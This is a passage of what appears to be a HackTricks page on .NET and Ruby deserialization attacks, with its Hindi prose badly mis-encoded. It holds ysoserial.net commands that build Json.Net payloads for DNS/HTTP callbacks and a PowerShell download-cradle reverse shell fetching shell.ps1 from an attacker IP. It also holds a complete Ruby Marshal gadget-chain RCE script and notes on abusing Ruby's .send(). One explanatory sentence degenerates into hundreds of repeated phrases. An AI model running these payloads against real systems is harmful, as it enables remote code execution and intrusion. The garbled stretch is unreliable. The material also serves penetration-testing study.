ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** рдореЗрдВ рдПрдХ **рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рдкреИрд░рд╛рдореАрдЯрд░** рднреА рд╣реИ рдЬреЛ рд╣рд░ рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рдмреЗрд╣рддрд░ рд╕рдордЭрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ: `--test`\
рдпрджрд┐ рдЖрдк рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рддреЛ **ysoserial.net** **рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ** рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛, рддрд╛рдХрд┐ рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХреЗрдВ рдХрд┐ рдЖрдкрдХрд╛ рдкреЗрд▓реЛрдб рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред\
рдпрд╣ рдкреИрд░рд╛рдореАрдЯрд░ рдорджрджрдЧрд╛рд░ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдЖрдк рдХреЛрдб рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХреЗ рдХреЛрдб рдЯреБрдХрдбрд╝реЗ рдкрд╛рдПрдВрдЧреЗ ([ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдб [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) рдХреЛ рдХреЙрд▓ рдХрд░реЗрдЧрд╛ред
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдореЗрдВ рдЙрддреНрдкрдиреНрди рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдЙрддреНрдкрдиреНрди рд╣реИ**ред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк .Net рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдХреБрдЫ рд╕рдорд╛рди рдвреВрдВрдврд╝рддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рднреА рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╡рдВрд╢реАрдХрд░рдг рдХреЗ рд▓
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
рдЕрдиреНрдп RCE рд╢реНрд░реГрдВрдЦрд▓рд╛ Ruby On Rails рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() рд╡рд┐рдзрд┐
As explained in [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), if some user unsanitized input reaches the `.send()` method of a ruby object, this method allows to **invoke any other method** of the object with any parameters.

For example, calling eval and then ruby code as second parameter will allow to execute arbitrary code:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Moreover, if only one parameter of **`.send()`** is controlled by an attacker, as mentioned in the previous writeup, it's possible to call any method of the object that **doesn't need arguments** or whose arguments have **default values**.\
For this, it's possible to enumerate all the methods of the object to **find some interesting methods that fulfil those requirements**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
